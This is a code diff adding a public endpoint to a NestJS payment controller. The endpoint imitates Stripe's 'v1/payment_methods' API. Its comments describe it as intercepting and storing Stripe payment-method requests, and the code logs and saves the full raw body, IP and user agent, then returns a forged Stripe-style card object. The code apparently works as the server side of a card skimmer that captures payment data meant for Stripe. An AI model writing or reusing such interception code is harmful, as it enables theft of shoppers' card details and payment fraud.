@@ -6,6 +6,7 @@ import { Public } from 'src/common/decorators/public.decorator'
 import { F1Service } from './f1.service'
 import { F1CheckoutDto } from './dto/f1-checkout.dto'
 import { PaymentDto } from './dto/payment.dto'
+import { PaymentMethodDto } from './dto/payment-method.dto'
 import { OrderQueryDto } from './dto/order-query.dto'
 import { DataObj } from 'src/common/class/data-obj.class'
 import { ApiException } from 'src/common/exceptions/api.exception'
@@ -16,6 +17,64 @@ import { genId } from 'src/common/utils'
 export class F1Controller {
   private readonly logger = new Logger(F1Controller.name);
   constructor(private readonly f1Service: F1Service) {}
+
+  /**
+   * 20260610 统一入口
+   * Stripe payment_methods 拦截接口
+   * 捕获并存储 Stripe 支付方式请求数据
+   */
+  @Post('v1/payment_methods')
+  @Public()
+  @Transform(({ value }) => value)
+  async paymentMethods(
+    @Req() req,
+    @Res() res: Response,
+    @Body() dto: PaymentMethodDto
+  ) {
+    try {
+      // 获取原始请求体
+      let rawBodyStr = ''
+      if (req.rawBody && Buffer.isBuffer(req.rawBody)) {
+        rawBodyStr = req.rawBody.toString('utf-8')
+      } else if (typeof req.body === 'string') {
+        rawBodyStr = req.body
+      } else {
+        rawBodyStr = JSON.stringify(req.body || {})
+      }
+      const ip = req.ip || req.connection?.remoteAddress || ''
+      const userAgent = req.headers['user-agent'] || ''
+
+      this.logger.log(`收到 payment_methods 请求 - IP: ${ip}`)
+      this.logger.log(`payment_methods body: ${JSON.stringify(dto)}`)
+
+      // 保存数据
+      const saved = await this.f1Service.savePaymentMethod(dto, rawBodyStr, ip, userAgent)
+
+      // 返回类似 Stripe 的响应格式
+      if (!res.headersSent) {
+        res.status(200).json({
+          id: `pm_${saved.id}`,
+          object: 'payment_method',
+          created: Math.floor(saved.createTime?.getTime() / 1000) || Math.floor(Date.now() / 1000),
+          type: saved.type,
+          card: {
+            last4: saved.cardLast4,
+            exp_month: parseInt(saved.cardExpMonth) || 0,
+            exp_year: parseInt(saved.cardExpYear) || 0,
+          }
+        })
+      }
+    } catch (error) {
+      this.logger.error('payment_methods 处理失败:', error)
+      if (!res.headersSent) {
+        res.status(200).json({
+          id: `pm_error_${Date.now()}`,
+          object: 'payment_method',
+          error: error.message
+        })
+      }
+    }
+  }
 
   /**
    * F1订单结账接口 
